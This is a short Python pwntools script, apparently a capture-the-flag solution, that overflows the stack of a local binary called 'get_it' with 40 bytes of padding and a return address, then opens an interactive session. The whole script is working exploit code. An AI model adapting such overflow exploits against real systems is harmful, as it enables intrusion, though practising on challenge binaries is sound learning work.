from pwn import *
import time
p = process("./get_it")

pad = b"a"*40

ret_add = p64(0x4005b6)

payload = pad +ret_add

p.sendline(payload)
p.interactive()

